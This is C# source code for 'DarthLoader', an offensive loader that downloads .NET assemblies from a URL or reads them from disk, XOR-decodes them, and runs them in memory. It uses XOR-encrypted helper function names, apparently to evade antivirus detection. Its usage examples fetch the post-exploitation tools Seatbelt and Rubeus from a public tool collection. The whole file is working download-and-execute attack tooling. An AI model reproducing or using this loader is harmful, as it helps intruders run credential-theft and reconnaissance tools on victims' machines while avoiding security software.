using System;
using System.Reflection;
using System.Threading;
using System.Net;

namespace DarthLoader
{
    class DarthLoader
    {
        public static string FunctionsXorKey = "";

        static byte[] FetchRemoteAssembly(string url, string xorKey = "")
        {
            byte[] programBytes = null;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient webClient = new WebClient();
            int count = 2;

            while (count >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = Helpers.XorBytes(webClient.DownloadData(url), xorKey);
                }
                catch (WebException)
                {
                    Console.WriteLine("[!] Assembly not found!");
                    Console.WriteLine($"[+] Retrying download...");
                    count--;
                    Thread.Sleep(2000);
                }
                catch (NotSupportedException)
                {
                    Console.WriteLine("[!] URL not valid. Check URL argument.");
                    Environment.Exit(-1);
                }
            }
            return programBytes;
        }

        static void Main(string[] args)
        {
            string banner =
                @"
 _______                     __     __       __                              __                   
|       \                   |  \   |  \     |  \                            |  \                  
| $$$$$$$\ ______   ______ _| $$_  | $$____ | $$      ______   ______   ____| $$ ______   ______  
| $$  | $$|      \ /      |   $$ \ | $$    \| $$     /      \ |      \ /      $$/      \ /      \ 
| $$  | $$ \$$$$$$|  $$$$$$\$$$$$$ | $$$$$$$| $$    |  $$$$$$\ \$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$\
| $$  | $$/      $| $$   \$$| $$ __| $$  | $| $$    | $$  | $$/      $| $$  | $| $$    $| $$   \$$
| $$__/ $|  $$$$$$| $$      | $$|  | $$  | $| $$____| $$__/ $|  $$$$$$| $$__| $| $$$$$$$| $$      
| $$    $$\$$    $| $$       \$$  $| $$  | $| $$     \$$    $$\$$    $$\$$    $$\$$     | $$      
 \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$                                                                                                                                           
                ";

            if (args.Length == 6)
            {
                if (args[0] == "--FunctionsXorKey" && args[2] == "--FilePath" && args[4] == "--Args")
                {
                    FunctionsXorKey = args[1];
                    string filePath = args[3];
                    string assemblyArgs = args[5];
                    Helpers.FirstHelperFunction();
                    Helpers.SecondHelperFunction();

                    if (!filePath.StartsWith("http"))
                    {
                        Console.WriteLine(banner);
                        Console.WriteLine($"[+] Loading assembly from file path: {filePath}");
                        Console.WriteLine("[+] Assembly loaded into memory... ");
                        Console.WriteLine("[+] Hit any key to run...");
                        Console.ReadKey();
                        Helpers.ExecuteLocalFileArgs(filePath, assemblyArgs);
                    }
                }
                else if (args[0] == "--FunctionsXorKey" && args[2] == "--FilePath" && args[4] == "--XorKey")
                {
                    FunctionsXorKey = args[1];
                    string filePath = args[3];
                    string xorKey = args[5];
                    Helpers.FirstHelperFunction();
                    Helpers.SecondHelperFunction();

                    if (filePath.StartsWith("http"))
                    {
                        Console.WriteLine(banner);
                        Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {xorKey}");
                        byte[] assemblyBytes = FetchRemoteAssembly(filePath, xorKey);
                        Console.WriteLine("[+] Encrypted assembly loaded into memory... ");
                        Console.WriteLine("[+] Hit any key to run...");
                        Console.ReadKey();
                        Helpers.ExecuteRemoteAssembly(assemblyBytes, xorKey);
                    }
                }
            } 
            else if (args.Length == 4)
            {
                if (args[0] == "--FunctionsXorKey" && args[2] == "--FilePath")
                {
                    FunctionsXorKey = args[1];
                    string filePath = args[3];
                    Helpers.FirstHelperFunction();
                    Helpers.SecondHelperFunction();

                    if (!filePath.StartsWith("http"))
                    {
                        Console.WriteLine(banner);
                        Console.WriteLine($"[+] Loading assembly from file path: {filePath}");
                        Console.WriteLine("[+] Assembly loaded into memory... ");
                        Console.WriteLine("[+] Hit any key to run...");
                        Console.ReadKey();
                        Helpers.ExecuteLocalFile(filePath);
                    }
                }
            }
            else if (args.Length == 8)
            {
                if ((args[0] == "--FunctionsXorKey" && args[2] == "--FilePath" && args[4] == "--Args" && args[6] == "--XorKey"))
                {
                    FunctionsXorKey = args[1];
                    string filePath = args[3];
                    string assemblyArgs = args[5];
                    string xorKey = args[7];
                    Helpers.FirstHelperFunction();
                    Helpers.SecondHelperFunction();

                    if (filePath.StartsWith("http"))
                    {
                        Console.WriteLine(banner);
                        Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {xorKey}");
                        byte[] assemblyBytes = FetchRemoteAssembly(filePath, xorKey);
                        Console.WriteLine("[+] Encrypted assembly loaded into memory... ");
                        Console.WriteLine("[+] Hit any key to run...");
                        Console.ReadKey();
                        Helpers.ExecuteRemoteAssemblyArgs(assemblyBytes, xorKey, assemblyArgs);
                    }
                }
            }
            else
            {
                Console.WriteLine(banner);
                Console.WriteLine("==================== USAGE: ====================");
                Console.WriteLine("");
                Console.WriteLine("--FunctionsXorKey      : Xor key to decrypt function strings from DarthLoaderHelper.exe");
                Console.WriteLine("--FilePath             : a local file path or URL to load a .Net asseembly from");
                Console.WriteLine("--Args                 : Xor key to decrypt function strings from DarthLoaderHelper.exe");
                Console.WriteLine("--XorKey               : Xor key used to encrypt/decrypt .Net assembly from URL");
                Console.WriteLine("");
                Console.WriteLine("==================== EXAMPLES: ====================");
                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Seatbelt.exe --Args AntiVirus --XorKey test");
                Console.WriteLine("");
                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Rubeus.exe --XorKey test");
                Console.WriteLine("");
                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\devin\Desktop\Hello.exe");
                Console.WriteLine("");
                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\devin\Desktop\Hello.exe --Args test");
                Console.WriteLine("");
            }
        }
    }
}
